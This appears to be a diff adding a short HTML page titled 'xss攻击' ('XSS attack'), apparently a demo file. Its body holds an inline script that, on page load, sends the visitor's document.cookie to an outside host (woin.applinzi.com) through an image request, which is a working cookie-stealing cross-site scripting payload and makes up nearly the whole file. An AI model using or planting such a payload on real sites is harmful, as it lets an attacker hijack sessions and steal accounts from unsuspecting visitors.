@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<title>xss攻击</title>
+		
+		<script src="./plugins/jQuery/jquery-2.2.3.min.js"></script>
+	</head>
+	<body>
+		<p>66666<script>
+new Image().src="http://woin.applinzi.com?haha="+encodeURI(document.cookie);
+</script></p>
+	</body>
+	
+</html>
